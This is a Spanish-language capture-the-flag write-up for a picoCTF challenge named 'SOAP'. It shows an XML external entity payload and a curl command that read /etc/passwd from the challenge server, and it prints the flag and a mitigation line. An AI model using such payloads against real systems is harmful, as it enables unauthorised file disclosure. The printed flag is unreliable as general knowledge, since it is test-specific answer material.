##  SOAP
## Descripcion

The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?[Web Portal](http://saturn.picoctf.net:53213/)
## Solucion
### solucion 1

- Inyectamos una entidad XML externa, usando BurpSuite

`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [   <!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]> <data><ID>&xxe;</ID></data>`


picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}
### solucion 2_desde consola:

`curl -s -k -X POST http://saturn.picoctf.net:51598/data  -H 'Content-Type: application/xml'   --data-binary $'<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [\x0d\x0a  <!ELEMENT foo ANY >\x0d\x0a  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >\x0d\x0a]> <data><ID>&xxe;</ID></data>'`

## Notas

SOAP (Simple Object Access Protocol) es un ==protocolo estándar basado en XML para intercambiar mensajes estructurados entre aplicaciones==, permitiendo la comunicación entre sistemas heterogéneos y lenguajes diferentes. Es altamente seguro, estandarizado por el W3C, y funciona sobre protocolos como HTTP o SMTP. 


XML ([Extensible Markup Language](https://www.google.com/search?q=Extensible+Markup+Language&sca_esv=0c0ded2c55dfde36&rlz=1C1_____en&sxsrf=ANbL-n6243OqXXgAOQRoimEpqdZ9Kt4Zqw%3A1772648349937&ei=nXeoaYDmOPDfur8Pqs2r-A4&biw=1366&bih=607&oq=que+es+xml&gs_lp=Egxnd3Mtd2l6LXNlcnAiCnF1ZSBlcyB4bWwqAggBMgUQABiABDIKEAAYgAQYFBiHAjIFEAAYgAQyBRAAGIAEMgUQABiABDIFEAAYgAQyBRAAGIAEMgUQABiABDIFEAAYgAQyBRAAGIAESMApUJ8GWNUZcAF4AZABAJgBhQWgAYMTqgELMC42LjIuMS4wLjG4AQPIAQD4AQGYAgugArAVwgIKEAAYsAMY1gQYR8ICChAjGIAEGCcYigXCAgQQIxgnwgIQEC4YgAQYxwEYJxiKBRivAcICChAAGIAEGEMYigXCAgsQABiABBixAxiKBcICCxAAGIAEGLEDGIMBwgIIEAAYgAQYsQPCAg0QABiABBixAxhDGIoFmAMAiAYBkAYIkgcLMS40LjMuMi4wLjGgB5lesgcLMC40LjMuMi4wLjG4B6cVwgcHMi0xLjIuOMgHggKACAA&sclient=gws-wiz-serp&ved=2ahUKEwj6wOb17YaTAxV9I0QIHTvgG3cQgK4QegYIAQgAEAM)) es un ==lenguaje de marcado basado en texto utilizado en programación para estructurar, almacenar y transportar datos de forma legible tanto para humanos como para máquinas==. A diferencia de HTML, XML permite crear etiquetas personalizadas, lo que lo hace flexible para intercambiar información entre sistemas diversos, configuraciones y documentos electrónicos.
## Referencias
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);